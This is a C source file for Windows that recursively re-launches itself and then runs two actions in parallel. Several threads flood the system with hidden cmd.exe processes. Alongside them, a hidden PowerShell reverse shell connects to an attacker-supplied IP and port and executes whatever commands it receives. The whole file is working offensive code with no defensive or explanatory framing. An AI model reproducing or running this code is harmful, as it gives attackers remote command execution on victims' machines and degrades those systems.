#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

int get_depth();
void spawn_recursive(int depth, const char *prog_path, int max_depth, int flood_count, int flood_threads, const char *ip, const char *port);
void launch_powershell_payload(const char *ip, const char *port);
DWORD WINAPI flood_thread(LPVOID lpParam);
DWORD WINAPI launch_payload_thread(LPVOID lpParam);

// Struct to pass multiple parameters to threads
typedef struct {
    int flood_count;
    int flood_threads;
} FloodParams;

typedef struct {
    const char *ip;
    const char *port;
} PayloadParams;

int main(int argc, char *argv[]) {
    if (argc != 6) {
        printf("Usage: %s <max_depth> <flood_count> <flood_threads> <ip> <port>\n", argv[0]);
        return 1;
    }

    int max_depth = atoi(argv[1]);
    int flood_count = atoi(argv[2]);
    int flood_threads = atoi(argv[3]);
    const char *ip = argv[4];
    const char *port = argv[5];

    char prog_path[MAX_PATH];
    GetModuleFileNameA(NULL, prog_path, MAX_PATH);

    int depth = get_depth();

    if (depth >= max_depth) {
        printf("[*] Max depth reached, launching flood and payload...\n");

        HANDLE *threads = malloc((flood_threads + 1) * sizeof(HANDLE));
        if (!threads) {
            fprintf(stderr, "Failed to allocate thread handles\n");
            return 1;
        }

        // Launch payload in parallel thread
        PayloadParams *pparams = malloc(sizeof(PayloadParams));
        pparams->ip = ip;
        pparams->port = port;
        threads[0] = CreateThread(NULL, 0, launch_payload_thread, pparams, 0, NULL);

        // Launch flooding threads
        for (int i = 1; i <= flood_threads; i++) {
            FloodParams *fparams = malloc(sizeof(FloodParams));
            fparams->flood_count = flood_count;
            fparams->flood_threads = flood_threads;
            threads[i] = CreateThread(NULL, 0, flood_thread, fparams, 0, NULL);
        }

        WaitForMultipleObjects(flood_threads + 1, threads, TRUE, INFINITE);

        // Cleanup
        for (int i = 0; i <= flood_threads; i++) {
            CloseHandle(threads[i]);
        }
        free(threads);
        return 0;
    }

    spawn_recursive(depth, prog_path, max_depth, flood_count, flood_threads, ip, port);
    return 0;
}

int get_depth() {
    char *env = getenv("RECURSIVE_DEPTH");
    return env ? atoi(env) : 0;
}

void spawn_recursive(int depth, const char *prog_path, int max_depth, int flood_count, int flood_threads, const char *ip, const char *port) {
    char env_val[16];
    sprintf(env_val, "%d", depth + 1);
    SetEnvironmentVariableA("RECURSIVE_DEPTH", env_val);

    char cmdline[512];
    snprintf(cmdline, sizeof(cmdline), "\"%s\" %d %d %d %s %s", prog_path, max_depth, flood_count, flood_threads, ip, port);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (!CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("CreateProcess failed at depth %d, error %lu\n", depth, GetLastError());
        return;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    printf("Finished depth %d\n", depth);
}

DWORD WINAPI flood_thread(LPVOID lpParam) {
    FloodParams *params = (FloodParams *)lpParam;
    int count = params->flood_count / params->flood_threads;

    for (int i = 0; i < count; i++) {
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;

        if (CreateProcessA("C:\\Windows\\System32\\cmd.exe", "/c exit", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
    free(params);
    return 0;
}

DWORD WINAPI launch_payload_thread(LPVOID lpParam) {
    PayloadParams *params = (PayloadParams *)lpParam;
    launch_powershell_payload(params->ip, params->port);
    free(params);
    return 0;
}

void launch_powershell_payload(const char *ip, const char *port) {
    printf("[*] Launching reverse shell to %s:%s...\n", ip, port);

    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
        "powershell.exe -nop -w hidden -Command "
        "\"$c=New-Object Net.Sockets.TCPClient('%s',%s);"
        "$s=$c.GetStream();"
        "[byte[]]$b=0..65535|%%{0};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
        "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        "$sb=(iex $d 2>&1|Out-String);"
        "$sb2=$sb+'PS '+(pwd).Path+'> ';"
        "$o=([text.encoding]::ASCII).GetBytes($sb2);"
        "$s.Write($o,0,$o.Length);$s.Flush()};$c.Close()\"",
        ip, port);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("CreateProcess failed: %lu\n", GetLastError());
        return;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}
